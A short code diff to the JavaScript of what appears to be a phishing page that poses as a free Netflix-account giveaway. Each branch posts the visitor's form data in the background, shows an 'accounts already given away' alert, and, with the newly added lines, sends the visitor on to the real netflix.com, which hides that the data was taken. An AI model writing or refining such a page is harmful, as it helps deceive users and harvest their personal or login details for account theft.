@@ -28,6 +28,7 @@ if (isMobile) {
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
 		alert("Oops! You're late. All accounts are given away"); 
+		window.location = "https://www.netflix.com";
 	}
 	else{
 		var xhr = new XMLHttpRequest();
@@ -37,6 +38,7 @@ if (isMobile) {
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
 		alert("Oops! You're late. All accounts are given away"); 
+		window.location = "https://www.netflix.com";
 	}
 }
 };
@@ -66,6 +68,7 @@ if (isMobile) {
 				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				xhr.send(data);
 				alert("Oops! You're late. All accounts are given away");
+				window.location = "https://www.netflix.com";
 				}
 		};
 
